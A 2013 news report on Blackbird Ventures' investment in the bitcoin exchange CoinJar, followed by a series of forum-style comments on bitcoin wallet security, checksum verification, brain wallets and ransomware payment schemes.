Founded by young entrepreneurs Asher Tan and Ryan Zhou, CoinJar acts as a consumer bitcoin exchange and digital wallet provider for the nascent digital currency.
The platform allows users to buy, sell and make transactions in bitcoin, and provides merchant services for those looking to accept bitcoin payments.
The investment, of which Blackbird is contributing $250,000, comes as the value of a single bitcoin this week topped $1000 for the first time.
In 2010 a single bitcoin was valued at just 4c according to the Tokyo-based exchange Mt Gox.
Bitcoin is a digital currency that is controlled and stored entirely by computers spread across the internet.
But it is also a method to make payments, like using PayPal or the Visa credit card network, and is the world's first decentralised electronic currency, meaning it is not backed by any governments or centralised financial systems.
Today the value of bitcoins in the market is about $US12 billion ($13.2bn), based on recent prices, according to the website Bitcoincharts.com.
Hitting its $1000 peak is the latest milestone in yet another rally for the four-year old virtual currency, which has been boosted by support from senior US law enforcement and regulatory officials who have been discussing the pitfalls and promises of virtual currencies at congressional hearings in Washington.
However, the currency remains subject to bouts of volatilty, and with each drop in the cyber currency's price, bitcoin doubters are quick to claim the bitcoin bubble has burst.
But that has not fazed the investors at Blackbird, who see the bitcoin as the future currency of the internet.
"A global currency that is not controlled by any one centralised point is completely fascinating," said Niki Scevak, one of the co-founders of the $20 million early-stage investment fund Blackbird Ventures.
"No one owns or controls bitcoin, all transactions are public and there is no central controlling point of the protocol.
"Bitcoin offers an opportunity to bring banking and financial services to emerging middle classes of the developing world that have no access to financial institutions."
CoinJar, which started in May this year, was already conducting $2m in trades a month, said Mr Tan, its chief executive.
"Bitcoin is a very personal currency. The whole idea of person to person transfers without going through an intermediary is a very powerful idea," he said.
Mr Scevak said the appeal of Coinjar was its ability to make bitcoin more accessible to users of the currency.
"It's really hard to buy and use bitcoin because it is so young and nascent," he said.
"That's why companies like Coinjar are important, and I have complete faith that as the waves of start-ups and entrepreneurs build software for bitcoin, then issues with the currency will go away."

ANZ are seriously stuck in the dark ages. Unless something changed recently they don't even have 2FA or SMS verification. I'm guessing this is why they get so jumpy when even a slightly unusual transaction occurs, just to cover their arses.

If you look here:  there are SHA checksums you can use to verify.
SSL would be an improvement and would prevent MITM attacks, but it won't protect against a compromised server e.g. someone hacks into Sourceforge account and replaces the binaries. So SSL would arguably give a false sense of security.
The only way to be sure is to verify the checksums match, **and that they are signed with a valid key**. The devs' keys are all [here]( and various other places around the web.

The Silk Road wallet that was seized towards the start of the month was not cracked in any way, it was gained via physical access to the server. It was the hot wallet on the server, the one used for day-to-day transactions that needs to be unencrypted (at some point) in order for the transactions to be automated. Having to enter a password manually on this wallet would not be feasible given the number of transactions.
As for Ross Ulbricht's wallet, we don't know how that was seized, but either he gave them the password to his encrypted wallet or they found/cracked it somehow. But none of that has anything to do with getting a private key from the public key.
@_date: 2013-11-16 15:42:39

Yes scarce but limited in utility by the fact that it can't be split, which would put a cap on its value. Allowing it to split once would increase its utility and allow it to reach the next value cap. Which is kind of the opposite of what OP is saying i.e. divisibility decreases its value (to zero if you take it to infinitely divisible)

It's a proof-of-work scheme. The problem is that the work being done needs to
1) produce something of 'value' within ~10 minutes
2) Be able to scale/adjust as miners join and leave the market
3) be easily verified by everyone else in the network
Find something that satisfies all of those and you might be on to something.

Whether you have the private key is irrelevant at this point. If you told Virtex to transfer to an address, and nothing is showing on that address it means they haven't sent it yet, or you gave them a different address to the one you're monitoring.
Can you see in Virtex anywhere if it has processed the transaction? Maybe it's still pending. I've never used them, but most exchanges will show a complete history of your transactions. Verify that the address you gave them is correct.

Yes that's exactly what I mean. The QR code is that backup. It contains the code you're talking about, but for whatever reason blockchain.info doesn't show it in text form. You can save the QR code, and scan it back in later to restore your 2FA. Or if you want to see the code that is embedded in it, you can scan it using a QR code app and you'll get a URL like:

1) Correct, it will be flat out rejected as an invalid key
2) Why are you using a brain wallet to create K1? If you ever plan to store anything on K1/K2, it is only as safe as the brainwallet phrase you used, BIP38 is irrelevant. BIP38ing a brainwallet with a password the same as the phrase adds no value. If you only intend to use K2 to generate further keys (as per your original post) it *might* be ok, but personally I'd prefer a completely random K1 to be safe. BIP38 and brain wallets aren't designed to be mixed together.

Firstly, though I'm sure it should be obvious, you should only store your wallet.dat online in encrypted form. If it's encrypted inside a Truecrypt container or 7zip file, there's no way for anyone to even know what's inside.
Storing your wallet with a third party is analogous to storing keys to a safety deposit box, or your online banking login and password. You're not storing the value with them, merely the means of accessing it.

The virus "phones home" to a command-and-control (C&amp;C) server, assuming it hasn't been blocked or shutdown already. Apparently it's pretty smart and can generate new domain names to try based on some time-based algorithm.
If they were smart and actually understood Bitcoin, they would be using a new Bitcoin address per install and just monitor the blockchain like TCL987 suggests, but it seems they're reusing addresses and ask the victim to submit the transaction ID. Pretty dumb really considering there's nothing linking the transaction ID to the user and the blockchain is publicly viewable.
Depending on the variant, there's multiple payment methods available with Bitcoin usually the cheapest. See:  Seems they value their customers and like to give them the freedom to choose what's convenient for them ;-)

Yes that's right. With Armory and Electrum, the only thing you need to backup are the seeds. You don't need to sync anything between the online and offline copies.
The only reason you'd want to backup the wallet file is to preserve settings and other data you might have added to your wallet. e.g. if you've labeled some addresses, or added some contacts to the address book. Also if you've manually imported any private keys, these won't be covered by the seed. But instead of 'polluting' your wallet with imported keys, usually it's recommended to sweep the balance from your non-Armory address to an address in your wallet.
Hope I'm not just adding to your confusion with the above :) But TL;DR you're safe based on what you've said.
